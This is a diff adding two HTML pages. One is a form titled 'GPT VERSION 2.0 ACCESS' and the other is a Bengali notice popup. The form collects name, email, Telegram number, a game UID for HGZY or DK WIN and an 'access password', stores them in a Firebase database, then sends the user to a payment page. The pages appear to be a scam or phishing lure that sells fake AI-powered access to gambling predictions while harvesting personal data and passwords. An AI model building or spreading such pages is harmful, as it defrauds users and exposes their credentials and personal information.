@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GPT VERSION 2.0 ACCESS</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }body {
+  background: linear-gradient(to right, #2b5876, #4e4376);
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  padding: 20px;
+}
+
+.container {
+  background-color: rgba(0, 0, 0, 0.7);
+  padding: 25px;
+  border-radius: 20px;
+  max-width: 420px;
+  width: 100%;
+  box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
+}
+
+.container img {
+  width: 100%;
+  border-radius: 15px;
+  margin-bottom: 20px;
+}
+
+.container h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  font-size: 22px;
+}
+
+.input-group {
+  margin-bottom: 15px;
+}
+
+.input-group label {
+  display: block;
+  font-weight: 600;
+  margin-bottom: 5px;
+}
+
+.input-group input,
+.input-group select {
+  width: 100%;
+  padding: 10px;
+  border-radius: 10px;
+  border: none;
+  outline: none;
+  background: #f0f0f0;
+  color: #333;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  background-color: #00ffc8;
+  color: #000;
+  font-weight: bold;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  transition: 0.3s ease;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #00c2a1;
+}
+
+.icon-label i {
+  margin-right: 8px;
+}
+
+  </style>
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+</head><body>
+  <div class="container">
+    <img src="https://i.postimg.cc/zfxYmVjv/my-password-concept-illustration-114360-3864.webp" alt="Header Image">
+    <h2><i class="fas fa-robot"></i> GPT VERSION 2.0 ACCESS PAGE</h2>
+    <form id="accessForm">
+      <div class="input-group">
+        <label class="icon-label"><i class="fas fa-user"></i> Full Name</label>
+        <input type="text" name="name" required>
+      </div><div class="input-group">
+    <label class="icon-label"><i class="fas fa-envelope"></i> Email</label>
+    <input type="email" name="email" required>
+  </div>
+
+  <div class="input-group">
+    <label class="icon-label"><i class="fab fa-telegram-plane"></i> Telegram Number</label>
+    <input type="text" name="telegram" required>
+  </div>
+
+  <div class="input-group">
+    <label class="icon-label"><i class="fas fa-layer-group"></i> Select Access Type</label>
+    <select name="accessType" required>
+      <option value="">-- Select One --</option>
+      <option value="HGZY">HGZY</option>
+      <option value="DK WIN">DK WIN</option>
+    </select>
+  </div>
+
+  <div class="input-group">
+    <label class="icon-label"><i class="fas fa-id-badge"></i> YOUR GAME UID</label>
+    <input type="text" name="uid" required>
+  </div>
+
+  <div class="input-group">
+    <label class="icon-label"><i class="fas fa-key"></i> Your Access Password</label>
+    <input type="password" name="password" required>
+  </div>
+
+  <button type="submit">Next To Payment Page</button>
+</form>
+
+  </div>  <script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyCbWwQZbCA4BZHeg5NUOyW5PjML9ypIfp4",
+  authDomain: "gpt-access-ab52c.firebaseapp.com",
+  projectId: "gpt-access-ab52c",
+  storageBucket: "gpt-access-ab52c.firebasestorage.app",
+  messagingSenderId: "344244460127",
+  appId: "1:344244460127:web:39e6db465240b7fd5699ea",
+  measurementId: "G-TYZTGP1R36"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    document.getElementById("accessForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const data = Object.fromEntries(formData.entries());
+
+      try {
+        await db.collection("gpt_access_requests").add(data);
+        window.location.href = "paymentbd.html";
+      } catch (err) {
+        alert("Something went wrong! Try again.");
+        console.error(err);
+      }
+    });
+  </script></body></html>
+  <!DOCTYPE html>
+  <html lang="bn">
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>নোটিশ পপআপ</title>
+  
+  <!-- Google Fonts & Material Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
+  
+  <style>
+  /* Custom scoped popup styles */
+  .smart-popup-overlay {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.5);
+  backdrop-filter: blur(6px);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  }
+  
+  .smart-popup {
+  background: rgba(255, 255, 255, 0.07);
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  border-radius: 16px;
+  padding: 25px 30px;
+  width: 90%;
+  max-width: 480px;
+  box-shadow: 0 12px 30px rgba(0, 0, 0, 0.5);
+  color: #fff;
+  font-family: 'Poppins', sans-serif;
+  backdrop-filter: blur(20px);
+  position: relative;
+  animation: fadeIn 0.4s ease;
+  }
+  
+  .smart-popup h2 {
+  font-size: 20px;
+  margin-bottom: 15px;
+  color: #ffeb3b;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  }
+  
+  .smart-popup p {
+  font-size: 15px;
+  line-height: 1.6;
+  color: #e0e0e0;
+  }
+  
+  .smart-popup .close-btn {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  background: rgba(255, 255, 255, 0.1);
+  border: none;
+  border-radius: 50%;
+  width: 35px;
+  height: 35px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  }
+  
+  .smart-popup .material-symbols-outlined {
+  font-size: 22px;
+  color: #ff4d4d;
+  font-variation-settings: 'FILL' 1, 'wght' 600, 'GRAD' 200, 'opsz' 48;
+  }
+  
+  @keyframes fadeIn {
+  from {opacity: 0; transform: scale(0.9);}
+  to {opacity: 1; transform: scale(1);}
+  }
+  
+  @media (max-width: 480px) {
+  .smart-popup {
+  padding: 20px;
+  }
+  .smart-popup h2 {
+  font-size: 18px;
+  }
+  .smart-popup p {
+  font-size: 14px;
+  }
+  }
+  </style>
+  </head>
+  <body style="margin: 0; background: transparent;">
+  
+  <!-- Popup Overlay -->
+  <div class="smart-popup-overlay" id="popupNotice">
+  <div class="smart-popup">
+  <button class="close-btn" onclick="document.getElementById('popupNotice').style.display='none'">
+  <span class="material-symbols-outlined">close</span>
+  </button>
+  <h2><span class="material-symbols-outlined">notification_important</span> গুরুত্বপূর্ণ নোটিশ</h2>
+  <p>
+  🔔 অনুগ্রহ করে নিচের তথ্যগুলো **সঠিকভাবে প্রদান করুন**:<br><br>
+  ✅ আপনার <strong>নাম</strong>, <strong>ইমেইল</strong>, এবং <strong>টেলিগ্রাম নাম্বার</strong> অবশ্যই সঠিকভাবে দিন।<br><br>
+  🔑 <strong>HGZY/DK WIN UID</strong> এবং <strong>Access Password</strong> অবশ্যই মনে রাখবেন, কারণ এটি দিয়েই আপনি <strong>GPT VERSION 2.0</strong> অ্যাক্সেস নিতে পারবেন।<br><br>
+  ⚠️ ভুল তথ্য দিলে সিস্টেমে প্রবেশের সুযোগ বন্ধ হতে পারে।
+  </p>
+  </div>
+  </div>
+  
+  </body>
+  </html>
